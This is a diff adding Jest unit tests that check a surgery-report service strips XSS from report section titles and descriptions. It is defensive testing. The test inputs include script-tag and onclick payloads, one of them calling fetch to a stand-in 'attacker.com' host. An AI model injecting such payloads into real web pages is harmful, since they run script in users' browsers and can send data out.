@@ -202,6 +202,72 @@ describe('SurgeryRequestReportService — Report Sections (PRD Laudos)', () => {
     });
   });
 
+  // ─── Segurança VULN-02: sanitização XSS nas seções de laudo ────────────────
+  describe('sanitização de seções de laudo (VULN-02)', () => {
+    it('deve remover tag <script> do title antes de salvar', async () => {
+      (mockReportSectionRepo.count as jest.Mock).mockResolvedValue(0);
+      (mockReportSectionRepo.create as jest.Mock).mockReturnValue({});
+      (mockReportSectionRepo.save as jest.Mock).mockResolvedValue({});
+
+      await service.createReportSection(
+        'req-1',
+        {
+          title: '<script>alert("xss")</script>Diagnóstico',
+          description: undefined,
+        },
+        'user-1',
+      );
+
+      const createArg = (mockReportSectionRepo.create as jest.Mock).mock
+        .calls[0][0];
+      expect(createArg.title).not.toContain('<script>');
+      expect(createArg.title).toContain('Diagnóstico');
+    });
+
+    it('deve remover atributos onerror/onclick do description', async () => {
+      (mockReportSectionRepo.count as jest.Mock).mockResolvedValue(0);
+      (mockReportSectionRepo.create as jest.Mock).mockReturnValue({});
+      (mockReportSectionRepo.save as jest.Mock).mockResolvedValue({});
+
+      await service.createReportSection(
+        'req-1',
+        {
+          title: 'Título',
+          description: '<b onclick="steal()">texto</b>',
+        },
+        'user-1',
+      );
+
+      const createArg = (mockReportSectionRepo.create as jest.Mock).mock
+        .calls[0][0];
+      expect(createArg.description).not.toContain('onclick');
+      expect(createArg.description).toContain('texto');
+    });
+
+    it('deve remover <script> do description no updateReportSection', async () => {
+      const existing = {
+        id: 'sec-1',
+        title: 'Título',
+        description: 'original',
+      };
+      (mockReportSectionRepo.findOne as jest.Mock).mockResolvedValue(existing);
+      (mockReportSectionRepo.save as jest.Mock).mockResolvedValue(existing);
+
+      await service.updateReportSection(
+        'req-1',
+        'sec-1',
+        {
+          description:
+            '<p>Válido</p><script>fetch("http://attacker.com")</script>',
+        },
+        'user-1',
+      );
+
+      expect(existing.description).not.toContain('<script>');
+      expect(existing.description).toContain('<p>Válido</p>');
+    });
+  });
+
   // ─── PRD: Reformulação Laudos — US-003 (reorder) ────────────────────────
   describe('reorderReportSections', () => {
     it('deve executar batch update com dataSource.query para todas as sections', async () => {
